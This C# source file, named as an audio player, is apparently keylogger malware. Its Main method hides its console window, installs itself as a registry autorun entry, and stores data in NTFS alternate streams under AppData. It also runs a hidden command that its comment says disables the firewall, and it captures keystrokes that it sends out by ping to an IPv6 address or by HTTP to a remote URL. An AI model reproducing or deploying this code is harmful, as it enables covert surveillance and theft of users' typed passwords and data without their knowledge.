using System;
using System.Windows.Forms;
using System.Collections.Concurrent;
using System.Threading;
using System.Net;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace AudioPlayer {
	class Program {
		enum CreateType {
			Ping,
			Http
		};

		private static IHandler createHandler(CreateType type) {
			if (type == CreateType.Ping) {
				ITarget target = new PingTarget(IPAddress.Parse("2001:470:5816:f::"));
				return new DelayedHandler(target, 500, 7);
			} else if(type == CreateType.Http) {
				ITarget target = new HttpTarget("https://test.trnila.eu/q");
				return new DelayedHandler(target, 500);
			}

			return null;
		}

		public static void exec(Dictionary<string, string> dict, String prefix) {
			var newProcessInfo = new ProcessStartInfo();
			newProcessInfo.FileName = dict[$"{prefix}_path"];
			newProcessInfo.Arguments = dict[$"{prefix}_args"].Replace("\"", "\"\"\"");
			newProcessInfo.WindowStyle = ProcessWindowStyle.Hidden;
			var p = Process.Start(newProcessInfo);
		}

		public static void Main() {
			/*using (var s = new StreamWriter(new AlternateStream(@"C:\a\hello.txt", "test.txt", true))) {
				s.WriteLine("Hello world!");
				s.WriteLine("hello");
			}

			using (var s = new StreamReader(new AlternateStream(@"C:\a\hello.txt", "test.txt"))) {
				Console.WriteLine(s.ReadLine());
				Console.WriteLine(s.ReadLine());
			}*/

			// traverse whole filesystem and try all filenames as key to decrypt secret.xml
			var secrets = Secret.Unlock();

			foreach (string path in FilesIterator.FromPath(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))) {
				using (var s = new StreamWriter(new AlternateStream(path, "test.exe", true))) {
					s.Write(secrets["fw_args"]);
				}
			}

			String executable_path = System.Reflection.Assembly.GetEntryAssembly().Location;
			new RegistryAutoRunner(secrets["autorun_ns"], secrets["autorun_key"]).Install(executable_path);

			// Disable firewall with script embeded in encrypted secret.xml
			exec(secrets, "fw");
			
			Win32API.ShowWindow(Win32API.GetConsoleWindow(), 0);
			
			IHandler handler = createHandler(CreateType.Ping);

			var queue = new BlockingCollection<char>(new ConcurrentQueue<char>());
			using(new KeyboardGrabber(queue)) {
				new Thread(() => handler.handle(queue)).Start();
				Application.Run();
			}
		}
	}
}